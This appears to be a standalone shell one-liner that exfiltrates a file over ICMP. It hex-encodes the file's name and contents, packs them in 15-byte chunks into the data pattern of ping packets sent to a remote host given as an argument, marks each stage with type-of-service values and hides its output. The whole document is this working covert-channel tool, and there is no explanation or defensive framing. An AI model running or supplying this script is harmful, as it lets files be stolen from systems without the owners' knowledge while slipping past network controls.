echo $1 | xxd -p -c 15 | while read filename; do ping -Q 1 -s $((${#filename}/2)) -c 1 -p $filename -w 1 $2 ; done > /dev/null && xxd -p -c 15 $1 | while read line; do ping -Q 0 -s $((${#line}/2)) -c 1 -p $line $2 ; done > /dev/null && ping -Q 2 -s 0 -c 1 $2 > /dev/null